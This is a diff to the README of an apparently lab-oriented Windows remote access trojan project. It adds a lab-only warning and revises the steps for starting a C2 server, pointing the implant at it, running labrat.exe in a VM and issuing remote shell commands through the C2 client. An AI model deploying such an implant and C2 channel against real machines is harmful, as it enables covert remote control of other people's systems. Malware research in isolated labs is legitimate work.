@@ -2,6 +2,9 @@
 
 Research implant implementing v0.1 → v0.5 from skill `windows-rat-dev`.
 
+**Target environment:** isolated Windows 11 lab VM only (no KVM host setup in this
+repo — use whatever hypervisor your machine supports, e.g. Hyper-V on Windows host).
+
 **Never run on production systems or against third parties.**
 
 ## Versions (same codebase)
@@ -33,14 +36,15 @@ cd server
 python3 c2_server.py --host 0.0.0.0 --port 8080
 ```
 
-Edit `implant/include/config.h` — set `C2_HOST` to your server IP (Win11 VM must reach it).
+Edit `implant/include/config.h` — set `C2_HOST` to an IP the Win11 guest can reach
+(host LAN IP or hypervisor gateway). Guest must reach that IP:port.
 
-## Run implant (Win11 isolation VM)
+## Run implant (Win11 lab guest)
 
-1. Snapshot VM before first run
-2. Copy `labrat.exe` to VM
-3. `labrat.exe` (or `wine labrat.exe` for smoke test on Linux)
-4. On server: `python3 c2_client.py shell whoami`
+1. Snapshot a clean Win11 lab VM
+2. Copy `labrat.exe` into guest (HTTP pull from host recommended)
+3. Run `labrat.exe` inside the VM only
+4. On host: `python3 c2_client.py shell whoami`
 
 ## Test matrix (document on Win11)
 
